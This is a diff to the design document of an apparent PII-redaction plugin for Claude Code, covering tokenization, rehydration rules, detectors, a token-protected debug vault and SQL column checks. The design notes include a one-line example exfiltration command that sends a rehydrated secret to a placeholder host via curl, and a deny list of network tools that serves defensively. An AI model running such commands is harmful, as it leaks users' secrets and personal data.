@@ -51,7 +51,7 @@ Constants in code: dtype `q4`, threshold `0.5`, size cap `32KB`, data-source pat
   `allowlist`: terms never treated as PII. `allowPii.mcpServers`: MCP server name prefixes whose tool inputs get real values rehydrated. `allowPii.tools`: built-in tools that get rehydrated. Defaults when the file is absent: no MCP servers, tools `Write`, `Edit`, `MultiEdit`. `Bash` is not rehydrated by default: `curl https://x/<PII:secret:1>` would otherwise exfiltrate the real value. Projects that add `Bash` still get a hard deny when the rehydrated command contains a network tool (`curl`, `wget`, `ssh`, `scp`, `gh`, `git push`, cloud CLIs, `docker push`, `npm publish`, ...).
 - `.hush/schema.json`: PII column classification, built by the `hush-schema` skill, see below.
 
-The daemon resolves `.hush/` by walking up from the hook payload's `cwd`.
+The daemon resolves `.hush/` by walking up from the hook payload's `cwd`. The proxy maps a request to its session through `metadata.user_id` (Claude Code puts `session_id` there) and uses that session's project policy; an unknown session gets the default policy with an empty allowlist, never another session's. Project config is trusted once Claude Code runs in that directory: opening a repo already means accepting its `.claude/settings.json` hooks, which are far more powerful than `.hush/config.json`, so no second trust prompt.
 
 ## Detection
 
@@ -62,7 +62,7 @@ Two detectors run over text. Spans are merged, highest score wins on overlap.
 | Regex | Rijksregisternummer (11 digits, mod-97 check), BE IBAN, BTW `BE0xxx.xxx.xxx`, `+32` phones, gitleaks-style secret patterns (AWS, GitHub PAT, JWT, private key headers, generic `api[_-]?key=`) | Deterministic, runs first. |
 | `openai/privacy-filter` (1.5B MoE, 50M active, q4 917MB) | account_number, private_address, private_email, private_person, private_phone, private_url, private_date, secret | English-trained. |
 
-The project `allowlist` removes known-safe terms from results before tokenization.
+The project `allowlist` removes known-safe terms from results before tokenization. A span is dropped when it equals an allowlisted term or is a piece of one (`Van Gossum` for `Ewout Van Gossum`); containing a term is not enough, so `alice@qmino.com` stays PII when only `qmino.com` is allowlisted. Overlapping spans are merged into their union, the label follows the highest score.
 
 Deferred: a Dutch NER model for person and location names. Added only if gate 2 on a Dutch Rovo issue shows misses. Candidate `Xenova/bert-base-multilingual-cased-ner-hrl`.
 
@@ -72,7 +72,9 @@ Detected values are replaced with stable tokens: `<PII:email:3>`, `<PII:person:1
 
 Rehydration (token -> real value) happens in PreToolUse for tools listed in `allowPii.tools` and for MCP tools whose server is listed in `allowPii.mcpServers`. Everything else keeps the tokens in its input, so nothing leaks, at the cost of a literal `<PII:person:1>` landing in the target if Claude tries. Outputs of whitelisted MCP servers are still tokenized on the way in; the whitelist only governs what goes out.
 
-`GET /debug/vault` dumps the map. Loopback only, always on. `curl 127.0.0.1:47831/debug/vault`.
+`GET /debug/vault` dumps the map. Loopback only, and like `/hook` and `/shutdown` it requires the header `x-hush-token` with the contents of `${CLAUDE_PLUGIN_DATA}/token` (generated on first start, mode 0600), so other local users or stray processes cannot read or rehydrate the vault. The `/v1/*` proxy needs no token: it only ever removes data. `curl -H "x-hush-token: $(cat ~/.claude/plugins/data/hush/token)" 127.0.0.1:47831/debug/vault`.
+
+The vault is shared by every session of the same OS user, by design (stable tokens across sessions). Tokens are guessable (`<PII:secret:1>`), so any Claude session on the machine can have a token rehydrated into its own Write. That is the same user's data landing in the same user's files; accepted.
 
 ## Redaction in the proxy
 
@@ -83,7 +85,8 @@ The proxy rewrites the request body before forwarding. Any error during parsing 
 | `role: user` text | Full scan, all labels + regex, tokenize | Yes |
 | `tool_result` of a data source (WebFetch, `mcp__*`, Bash whose command matches the data-source pattern) | Above 32KB: replaced with `Output too large for PII filter (N KB). Narrow the query: head, grep, LIMIT, or a smaller page.` Otherwise: MCP JSON key pass, then full scan, tokenize | Yes |
 | Every other `tool_result` (Read, Grep, other Bash) | Regex pass (secrets, Belgian identifiers), then replace vault-known real values with their tokens, plain string match | No |
-| System prompt, assistant messages | Untouched | |
+| System prompt (`system` string or text blocks) | Full scan, tokenize (memoized, so once per distinct prompt) | Yes |
+| Assistant messages | Untouched | |
 
 The third row closes the loop: a value rehydrated into a Bash command or written to a file cannot re-enter the API through Read or grep output. Redaction is memoized per block by content hash, so resent history costs one lookup per block.
 
@@ -99,7 +102,7 @@ UserPromptSubmit blocks (`decision: block`) only when a **secret** is detected, 
 
 PreToolUse on `Bash` and `mcp__*`. One extraction step, two regex passes, no model, no SQL parser.
 
-**Extraction.** From Bash: the command itself, plus the content of a referenced local file (`bash x.sh`, `sh x.sh`, `psql -f x.sql`, `mysql < x.sql`, `python x.py`, `npm run <script>` via `package.json`) read from `cwd`, depth 1. From MCP: any `sql`, `query` or `statement` input field. Application code written through Write and Edit is not checked.
+**Extraction.** From Bash: the command itself, plus the content of a referenced local file (`bash x.sh`, `sh x.sh`, `psql -f x.sql`, `mysql < x.sql`, `python x.py`, `./x.sh`, `npm run <script>` via `package.json`) read from `cwd`, depth 1. From MCP: any string field named like `sql`, `query`, `statement`, `command` or `script`, at any depth. A referenced script over 1 MB or unreadable makes the command ask. Application code written through Write and Edit is not checked.
 
 **Destructive pass.** Two tiers.
 
@@ -125,7 +128,7 @@ Ask (permission prompt with the matched pattern and file as reason):
 }
 ```
 
-Labels are the 8 privacy-filter labels plus `pii` as a generic fallback. Returns `ask` when the extracted SQL contains a classified column name (word-boundary, case-insensitive, with or without table prefix or quotes) or `SELECT *` / `SELECT t.*` from a table that has classified columns. Reason: `Query touches PII column customer.email (private_email). Filter on customer_id or drop the column.` Identifier matching is enough because the outcome is a prompt, not a block.
+Labels are the 8 privacy-filter labels plus `pii` as a generic fallback. Returns `ask` when the extracted SQL contains a classified column name (word-boundary, case-insensitive, with or without table prefix or quotes) or `SELECT *` / `SELECT t.*` from a table that has classified columns. Reason: `Query touches PII column customer.email (private_email). Filter on customer_id or drop the column.` Identifier matching is enough because the outcome is a prompt, not a block. Comments and string literals are stripped before the `WHERE` and column checks; a quoted chunk that itself contains SQL keywords (shell-quoted statements) is kept. A `.hush/schema.json` that exists but does not parse makes every SQL command ask until it is fixed.
 
 ## Hooks
 
